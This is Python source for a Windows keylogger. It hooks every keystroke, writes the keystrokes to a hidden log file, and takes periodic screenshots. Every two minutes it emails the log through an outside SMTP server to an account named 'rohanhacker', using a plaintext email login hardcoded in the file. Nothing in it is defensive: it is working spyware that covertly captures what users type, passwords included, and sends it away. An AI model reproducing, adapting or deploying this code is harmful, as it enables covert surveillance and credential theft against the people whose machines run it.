import pyHook,sys,pythoncom,win32console
import smtplib,logging,os,autopy
import threading
from datetime import datetime
import win32api, win32con

i = 0
j = 0
j2 = 0
def sendmail(save):
	server = smtplib.SMTP('smtp.live.com', 25)
	verify1 = server.ehlo()
	debig = server.starttls()
	print verify1
	print debig
	server.login("rohanhacker@outlook.in", "r0ckstarS")
	msg = "\n"+save
	server.sendmail("rohanhacker@outlook.in", "rohanhacker@outlook.in", msg)
def screenshot():
	global i
	global j
	n = datetime.now()
	if n.minute % 2 == 0 and j != n.minute :
		i += 1
		j = n.minute
		s = "name"+str(i)+".png";
		bitmap = autopy.bitmap.capture_screen()
		bitmap.save('B:\\works\{}'.format(s))
#	threading.Timer(60, screenshot).start()
def OnKeyboardEvent(event):
	if event.Ascii !=0 or 8:
		screenshot()		
		file_log = 'B:\\systemlog.txt' 
		if os.path.isfile(file_log) != True:
			f = open(file_log,'w')
			f.write(chr(event.Ascii))
			f.close()
			win32api.SetFileAttributes(file_log,win32con.FILE_ATTRIBUTE_HIDDEN)
		else:
			f = open(file_log,'r+')
			save = f.read()
			n = datetime.now()
			global j2
			if n.minute % 2 == 0 and j2!= n.minute:
				j2 = n.minute
				sendmail(save)
				f.write('')
			f.close()
			k=chr(event.Ascii)
			if event.Ascii==13:
				k='\n'    
			if event.Ascii==32:
				k='  '
			save += k
			f = open(file_log,'r+')
			f.write(save)
			f.close()
	return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()